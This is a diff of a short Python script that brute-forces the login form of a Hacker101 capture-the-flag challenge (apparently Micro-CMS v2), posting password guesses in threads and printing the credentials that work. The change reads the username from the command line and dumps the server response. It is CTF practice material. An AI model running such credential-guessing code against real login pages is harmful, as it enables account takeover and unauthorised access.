@@ -2,17 +2,19 @@ import requests
 from time import sleep
 import threading
 import os
+import sys
 
 def check_username(username, password, url):
     data = {"username": username, "password": password}
     response = requests.post(url, data=data)
     if "Invalid password" not in response.text:
-        print(f"Password found: {password}")
+        print(f"Username: {username}, Password: {password}")
+        print(response.text)
         os._exit(1)
     else:
         print(f"Incorrect password: {password}")
 
-username = "Username found from Micro-CMSv2_username.py"
+username = sys.argv[1]
 threads = []
 url = "https://{id}.ctf.hacker101.com/login"
 username_file = open("lists/names.txt", "r")
